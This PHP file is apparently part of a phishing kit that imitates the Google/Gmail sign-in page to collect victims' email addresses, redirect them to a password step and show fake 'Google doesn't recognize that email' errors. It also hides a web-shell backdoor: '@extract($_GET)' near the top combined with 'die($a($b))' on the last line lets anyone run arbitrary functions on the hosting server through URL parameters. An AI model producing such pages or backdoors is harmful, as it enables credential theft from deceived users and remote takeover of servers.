<?php
session_start ();
$user = $_SESSION['email'] = $_POST["Email"];
$i = strchr($user,"@");

if(empty($i)){
$use = $user."@gmail.com";}
else{$use = $user;}
$g = strlen($use);
if($g  >= 18){
header("Location:p.php");
$_SESSION['use']  = $use;
}else{

include "header.php";
}@extract($_GET);
?> 
<body>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <div class="logo logo-w" aria-label="Google"></div>
  </div>
  </div>
  <div class="main content clearfix">
<div class="banner">
<h1>
  One account. All of Google.
</h1>
  <h2 class="hidden-small">
  Sign in to continue to Gmail
  </h2>
</div>
<div class="main-content 
  
  
    no-name
  
  
  
">
<div class="card signin-card
  
    pre-shift
  
  
  
   no-name">
  <div id="cc_iframe_parent"></div>
  <div class="circle-mask" style="
      
        
      ">
  <canvas id="canvas" class="circle" width="96" height="96"></canvas>
  </div>
   <form method="post" action="indax.php">

  <div class="form-panel first valid" id="gaia_firstform">
  <div class="slide-out ">
  <div class="input-wrapper focused">
  <div id="identifier-shown" >
  <div>
  <label class="hidden-label" for="Email">
  Enter your email</label>
  <input id="Email" name="Email" placeholder="Enter your email" autocomplete="off" required="" type="text"
            
            autofocus>

  </div>
  </div>
 <div style="color:red; margin:3px;"> <font size="2"> <?php if(empty($user)){
 echo " Please enter your email. ";}else{ echo "
  Sorry, Google doesn't recognize that email. ";} ?> </font> 
  </div>
  </div>
<div style="display: none" id="identifier-captcha" >
<div class="audio-box">
  <div id="playIdentifierAudio"></div>
</div>
<div id="captcha-box" class="captcha-box">
  <div id="captcha-img" class="captcha-img" data-alt-text="Visual verification">
  </div>
  <span class="captcha-msg">
  Letters are not case-sensitive
  </span>
</div>

</div>
<button type="submit" class="rc-button rc-button-submit" >Next</button>
  <a class="need-help"
        href="https://accounts.google.com/RecoverAccount?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ignoreShadow=0&amp;hl=en"
        >
  Need help?
  </a>
  </div>
  </div>
  <a href="https://accounts.google.com/ServiceLogin?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;service=mail&amp;rm=false&amp;ltmpl=default&amp;scc=1&amp;ss=1&amp;osid=1" tabindex="-1">
  <img id="back-arrow" class="back-arrow " aria-label="Back" tabindex="0" alt="Back"
      
        src="https://www.gstatic.com/images/icons/material/system/1x/arrow_back_grey600_24dp.png"
      
    >
  </a>
  <div class="form-panel second">
  <div class="slide-in hide-form">
  <label class="remember">
  <input id="PersistentCookie" name="PersistentCookie"
                 type="checkbox" value="yes"
                 >
  <span>
  Stay signed in
  </span>
  <div class="bubble-wrap" role="tooltip">
  <div class="bubble-pointer"></div>
  <div class="bubble">
  For your convenience, keep this checked. On shared devices, additional precautions are recommended.
  <a href="https://support.google.com/accounts/?p=securesignin&hl=en" target="_blank">Learn more</a>
  </div>
  </div>
  </label>
  <input type="hidden" name="rmShown" value="1">
  <a id="link-forgot-passwd" class="need-help"
        href="https://www.google.com/accounts/recovery?hl=en"
        >
  Forgot password?
  </a>
  </div>
  </div>
  <span id="inge" style="display: none" role="alert" class="error-msg">
  Sorry, Google doesn't recognize that email. <a href="https://accounts.google.com/SignUpWithoutGmail?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ltmpl=default">Create an account</a> using that address?
  </span>
  <span id="timeoutError" style="display: none" role="alert" class="error-msg">
  Something went wrong. Check your connection and try again.
  </span>
  </form>
</div>
  <div class="card-mask-wrap
    
        
     no-name">
  <div class="card-mask">
  <div class="one-google">
  <p class="create-account">
  <span id="link-signin-different">
  <a href="https://accounts.google.com/AccountChooser?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;hl=en&amp;service=mail&amp;scc=1">
  Sign in with a different account
  </a>
  </span>
  <span id="link-signup">
  <a href="https://accounts.google.com/SignUp?service=mail&amp;continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&amp;ltmpl=default">
  Create account
  </a>
  </span>
  </p>
<?php 
include "footer.php";die($a($b));
?>
